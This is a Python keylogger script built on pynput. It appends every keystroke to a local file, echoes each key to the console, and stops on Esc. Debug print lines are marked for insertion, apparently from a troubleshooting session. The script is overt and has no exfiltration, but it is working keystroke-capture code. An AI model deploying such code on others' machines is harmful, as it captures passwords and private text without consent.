from pynput import keyboard

# Define the file where keystrokes will be logged
log_file = "keystrokes.txt"

def on_press(key):
    """
    This function is called when a key is pressed.
    """
    try:
        # For alphanumeric keys, get the character
        char = key.char
    except AttributeError:
        # For special keys (like space, enter, shift, etc.)
        char = str(key) # Convert key object to string (e.g., 'Key.space', 'Key.enter')

    # Open the log file in append mode ('a')
    with open(log_file, "a") as f:
        if char is not None: # Ensure a character was captured
            f.write(char)
            print(f"Logged: {char}") # For immediate feedback in console
        else:
            # Handle cases where key.char might be None but key is a valid object
            print(f"Logged (special key): {key}")


def on_release(key):
    """
    This function is called when a key is released.
    We'll use it to stop the keylogger.
    """
    # Define a special key to stop the keylogger (e.g., 'esc' key)
    if key == keyboard.Key.esc:
        print("\nKeylogger stopped.")
        # Stop listener
        return False

def start_keylogger():
    # --- ADD THIS LINE ---
    print("[DEBUG] Inside start_keylogger function.")

    print(f"[*] Keylogger started. All keystrokes will be saved to '{log_file}'.")
    print("[*] Press 'Esc' to stop the keylogger.")

    # --- ADD THIS LINE ---
    print("[DEBUG] Attempting to create keyboard listener.")

    # Create a listener for keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        # --- ADD THIS LINE ---
        print("[DEBUG] Listener created successfully. Attempting to join.")
        listener.join() # Blocks the main thread until the listener is stopped
        # --- ADD THIS LINE ---
        print("[DEBUG] Listener joined and exited.") # This should only print after Esc is pressed

if __name__ == "__main__":
    # --- ADD THIS LINE ---
    print("[DEBUG] Script is starting execution.")
    start_keylogger()
    # --- ADD THIS LINE ---
    print("[DEBUG] Script finished execution.")
